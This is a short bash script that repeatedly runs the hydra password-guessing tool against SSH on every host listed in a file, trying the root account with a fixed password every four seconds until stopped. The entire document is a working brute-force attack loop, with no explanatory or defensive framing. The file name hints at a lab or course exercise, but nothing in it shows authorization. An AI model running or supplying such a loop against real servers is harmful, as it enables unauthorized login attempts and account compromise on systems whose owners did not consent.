#!/bin/bash
# Runs the hydra brute-force command every 4 seconds, until Ctrl+C.
# Run from the backup/ directory, or adjust the path to syssecubuntus.txt.

while true; do
    hydra -l root -p 'hiasdfasdfasdf' -M syssecubuntus.txt ssh -t 32 -c 1
    sleep 4
done
